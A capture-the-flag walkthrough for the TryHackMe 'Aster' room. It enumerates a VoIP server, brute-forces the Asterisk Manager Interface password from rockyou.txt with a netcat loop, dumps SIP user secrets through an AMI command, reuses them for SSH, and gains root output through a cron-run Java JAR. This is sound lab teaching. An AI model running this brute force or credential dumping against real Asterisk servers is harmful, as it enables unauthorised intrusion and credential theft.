# Aster

Hack my server dedicated for building communications applications.

Room: https://tryhackme.com/room/aster

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/aster.md

## Overview

Aster is a VoIP-themed Linux room focused around Asterisk. The route was:

1. Enumerate services with Nmap.
2. Find a Python bytecode file from the web server.
3. Reverse the `.pyc` file to recover a username hint.
4. Brute-force the Asterisk Manager Interface.
5. Use AMI to enumerate SIP users.
6. Reuse SIP credentials over SSH.
7. Review a Java JAR file used by a root cron job.
8. Trigger the root-owned Java process to write the final file.

---

## Enumeration

I started with a full TCP scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt <target-ip>
```

The important results were:

```text
22/tcp   open  ssh
80/tcp   open  http
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
5038/tcp open  asterisk    Asterisk Call Manager 5.0.2
```

Port `5038` was the most interesting because it exposed the Asterisk Manager Interface.

---

## Web Enumeration

The web server was Apache and hosted a simple site.

Directory enumeration found:

```text
/index.html
/images/
/assets/
```

I checked the exposed directories and downloaded the files locally for review.

```bash
gobuster dir -u http://<target-ip>/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,js,bak,zip
```

A Python compiled bytecode file was discovered during enumeration.

---

## Reversing the Python Bytecode

The file was identified as Python 2.7 bytecode:

```bash
file output.pyc
```

Output:

```text
output.pyc: python 2.7 byte-compiled
```

I decompiled it with `uncompyle6`:

```bash
uncompyle6 output.pyc
```

Inside the decompiled source was a hex-encoded string. Decoding it revealed a useful hint:

```text
Good job, user "admin" the open source framework for building communications, installed in the server.
```

This gave the username:

```text
admin
```

And confirmed that the target service was Asterisk.

---

## Asterisk Manager Interface

I confirmed the AMI banner with Netcat:

```bash
nc <target-ip> 5038
```

Output:

```text
Asterisk Call Manager/5.0.2
```

Asterisk AMI does not accept just typing a username and password. It expects key/value actions like this:

```text
Action: Login
Username: admin
Secret: password
```

with a blank line after the request.

I tried a few guesses manually, but the intended path was to brute-force the AMI secret using `rockyou.txt`.

This loop worked really quickly:

```bash
while read p; do
  out=$(printf "Action: Login\r\nUsername: admin\r\nSecret: %s\r\n\r\n" "$p" | nc -w 1 <target-ip> 5038)
  echo "$out" | grep -q "Authentication accepted" && echo "FOUND: admin:$p" && break
done < /usr/share/wordlists/rockyou.txt
```

It found:

```text
admin:<redacted>
```

---

## Enumerating SIP Users

With valid AMI credentials, I used the `Command` action to run Asterisk commands.

```bash
printf 'Action: Login\r\nUsername: admin\r\nSecret: <ami-secret>\r\nEvents: OFF\r\n\r\nAction: Command\r\nCommand: sip show users\r\n\r\nAction: Logoff\r\n\r\n' \
| nc -w 5 <target-ip> 5038
```

The output revealed SIP users and their secrets:

```text
Username                   Secret
100                        100
101                        101
harry                      <redacted>
```

The SIP secret for `harry` was reused for SSH.

---

## SSH Access

I logged in as `harry`:

```bash
ssh harry@<target-ip>
```

Using the SIP secret found from AMI enumeration.

Once logged in, I grabbed the user flag:

```bash
cat user.txt
```

---

## Privilege Escalation Enumeration

Checking cron revealed a root job:

```bash
cat /etc/crontab
```

Important line:

```text
* * * * * root cd /root/java/ && bash run.sh
```

This showed that root was running a script every minute from `/root/java/`.

In Harry’s home directory, there was a JAR file:

```text
Example_Root.jar
```

I listed the contents:

```bash
jar tf Example_Root.jar
```

Output:

```text
META-INF/
META-INF/MANIFEST.MF
Example_Root.class
```

To understand what it did, I extracted and inspected the class:

```bash
mkdir /tmp/jarcheck
cp ~/Example_Root.jar /tmp/jarcheck/
cd /tmp/jarcheck
jar xf Example_Root.jar
javap -c -p Example_Root.class
```

The bytecode showed the important logic:

```text
String /tmp/flag.dat
String /home/harry/root.txt
String my secret <3 baby
```

The class checked whether `/tmp/flag.dat` existed. If it did, it wrote a file to Harry’s home directory.

---

## Triggering the Root Cron Job

Since the Java code was being run by root every minute, I created the trigger file:

```bash
touch /tmp/flag.dat
```

Then waited for cron to run:

```bash
sleep 90
```

After that, the root output file appeared in Harry’s home directory:

```bash
cat /home/harry/root.txt
```

---

## Summary

The main issue was exposed Asterisk AMI on port `5038`.

The Python bytecode gave the username, and a quick `rockyou.txt` brute force found the AMI secret. From there, AMI command execution allowed SIP user enumeration, which exposed SSH credentials for `harry`.

Privilege escalation was not a shell escape. Instead, a root cron job ran a Java JAR every minute. Reviewing the JAR showed it checked for `/tmp/flag.dat` and wrote the final file to Harry’s home directory.

Attack path:

```text
Nmap
→ Web enum
→ Python bytecode reverse
→ AMI username found
→ AMI brute force with rockyou
→ sip show users
→ SSH as harry
→ Review Example_Root.jar
→ Create /tmp/flag.dat
→ Root cron writes root.txt
```
